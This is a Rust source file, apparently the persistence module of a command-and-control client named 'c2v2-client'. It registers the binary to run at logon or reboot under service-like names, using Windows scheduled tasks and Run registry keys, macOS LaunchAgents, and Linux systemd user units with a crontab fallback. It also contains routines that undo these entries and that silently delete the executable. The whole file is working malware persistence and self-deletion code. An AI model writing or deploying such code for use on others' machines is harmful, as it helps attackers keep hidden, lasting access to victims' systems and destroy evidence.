use serde_json::{json, Value};
use std::path::PathBuf;
use std::process::{Command, Stdio};

pub fn exe_path() -> PathBuf {
    std::env::current_exe().unwrap_or_else(|_| PathBuf::from("c2v2-client"))
}

pub fn default_name(profile_name: &str) -> String {
    if !profile_name.is_empty() {
        return profile_name.to_string();
    }
    format!("svc-{}", crate::wire::rand_hex(3))
}

/// Install persistence using native OS mechanisms.
pub fn install(name: &str) -> Value {
    let exe = exe_path();
    let exe_s = exe.to_string_lossy().to_string();
    let mut actions = Vec::new();
    let mut errors = Vec::new();
    if cfg!(windows) {
        let st = Command::new("schtasks")
            .args([
                "/Create", "/SC", "ONLOGON", "/TN", name, "/TR", &format!("\"{}\" --daemon", exe_s),
                "/RL", "LIMITED", "/F",
            ])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status();
        match st {
            Ok(s) if s.success() => actions.push(format!("schtasks ONLOGON {}", name)),
            Ok(s) => errors.push(format!("schtasks exit {:?}", s.code())),
            Err(e) => errors.push(format!("schtasks: {}", e)),
        }
        let st = Command::new("reg")
            .args([
                "add",
                r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
                "/v",
                name,
                "/t",
                "REG_SZ",
                "/d",
                &format!("\"{}\" --daemon", exe_s),
                "/f",
            ])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status();
        match st {
            Ok(s) if s.success() => actions.push(format!("HKCU Run {}", name)),
            Ok(s) => errors.push(format!("reg exit {:?}", s.code())),
            Err(e) => errors.push(format!("reg: {}", e)),
        }
    } else if cfg!(target_os = "macos") {
        let dir = home().join("Library/LaunchAgents");
        let _ = std::fs::create_dir_all(&dir);
        let plist = dir.join(format!("{}.plist", name));
        let body = format!(
            r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>{name}</string>
<key>ProgramArguments</key><array><string>{exe}</string><string>--daemon</string></array>
<key>RunAtLoad</key><true/>
<key>KeepAlive</key><false/>
</dict></plist>
"#,
            name = name,
            exe = exe_s
        );
        match std::fs::write(&plist, body) {
            Ok(_) => {
                actions.push(format!("wrote {}", plist.display()));
                let _ = Command::new("launchctl").args(["load", "-w", &plist.to_string_lossy()]).status();
            }
            Err(e) => errors.push(format!("write plist: {}", e)),
        }
    } else {
        let dir = home().join(".config/systemd/user");
        let _ = std::fs::create_dir_all(&dir);
        let unit = dir.join(format!("{}.service", name));
        let body = format!(
            "[Unit]\nDescription={name}\nAfter=default.target\n\n[Service]\nType=simple\nExecStart={exe} --daemon\nRestart=on-failure\nRestartSec=30\n\n[Install]\nWantedBy=default.target\n",
            name = name,
            exe = exe_s
        );
        match std::fs::write(&unit, body) {
            Ok(_) => {
                actions.push(format!("wrote {}", unit.display()));
                let _ = Command::new("systemctl")
                    .args(["--user", "enable", "--now", &format!("{}.service", name)])
                    .stdout(Stdio::null())
                    .stderr(Stdio::null())
                    .status();
            }
            Err(e) => errors.push(format!("write unit: {}", e)),
        }
        // crontab fallback (dedup by marker)
        let marker = format!("# c2v2:{}", name);
        let existing = Command::new("crontab").arg("-l").output().ok();
        let mut lines = existing
            .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
            .unwrap_or_default();
        if !lines.contains(&marker) {
            lines.push_str(&format!("@reboot \"{}\" --daemon {}\n", exe_s, marker));
            let mut c = Command::new("crontab")
                .arg("-")
                .stdin(Stdio::piped())
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .spawn()
                .ok();
            if let Some(child) = c.as_mut() {
                use std::io::Write;
                if let Some(stdin) = child.stdin.as_mut() {
                    let _ = stdin.write_all(lines.as_bytes());
                }
                let _ = child.wait();
                actions.push("crontab @reboot".to_string());
            }
        }
    }
    json!({"installed": errors.is_empty(), "name": name, "actions": actions, "errors": errors})
}

pub fn remove(name: &str) -> Value {
    let mut actions = Vec::new();
    let mut errors = Vec::new();
    if cfg!(windows) {
        let _ = Command::new("schtasks").args(["/Delete", "/TN", name, "/F"]).status();
        actions.push(format!("schtasks delete {}", name));
        let _ = Command::new("reg")
            .args([
                "delete",
                r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
                "/v",
                name,
                "/f",
            ])
            .status();
        actions.push(format!("HKCU Run delete {}", name));
    } else if cfg!(target_os = "macos") {
        let plist = home().join(format!("Library/LaunchAgents/{}.plist", name));
        let _ = Command::new("launchctl").args(["unload", "-w", &plist.to_string_lossy()]).status();
        match std::fs::remove_file(&plist) {
            Ok(_) => actions.push(format!("removed {}", plist.display())),
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
            Err(e) => errors.push(format!("rm plist: {}", e)),
        }
    } else {
        let unit = home().join(format!(".config/systemd/user/{}.service", name));
        let _ = Command::new("systemctl")
            .args(["--user", "disable", "--now", &format!("{}.service", name)])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status();
        match std::fs::remove_file(&unit) {
            Ok(_) => actions.push(format!("removed {}", unit.display())),
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
            Err(e) => errors.push(format!("rm unit: {}", e)),
        }
        let marker = format!("# c2v2:{}", name);
        if let Ok(o) = Command::new("crontab").arg("-l").output() {
            let kept: Vec<String> = String::from_utf8_lossy(&o.stdout)
                .lines()
                .filter(|l| !l.contains(&marker))
                .map(|s| s.to_string())
                .collect();
            let mut c = Command::new("crontab")
                .arg("-")
                .stdin(Stdio::piped())
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .spawn()
                .ok();
            if let Some(child) = c.as_mut() {
                use std::io::Write;
                if let Some(stdin) = child.stdin.as_mut() {
                    let _ = stdin.write_all((kept.join("\n") + "\n").as_bytes());
                }
                let _ = child.wait();
                actions.push("crontab cleaned".to_string());
            }
        }
    }
    json!({"removed": errors.is_empty(), "name": name, "actions": actions, "errors": errors})
}

pub fn schedule_self_delete() {
    let exe = exe_path();
    let exe_s = exe.to_string_lossy().to_string();
    if cfg!(windows) {
        let _ = Command::new("cmd")
            .args([
                "/C",
                &format!("ping 127.0.0.1 -n 3 >NUL & del /F /Q \"{}\"", exe_s),
            ])
            .spawn();
    } else {
        let _ = Command::new("/bin/sh")
            .args(["-c", &format!("sleep 2; rm -f \"{}\"", exe_s)])
            .spawn();
    }
}

fn home() -> PathBuf {
    std::env::var("HOME")
        .or_else(|_| std::env::var("USERPROFILE"))
        .map(PathBuf::from)
        .unwrap_or_else(|_| PathBuf::from("."))
}
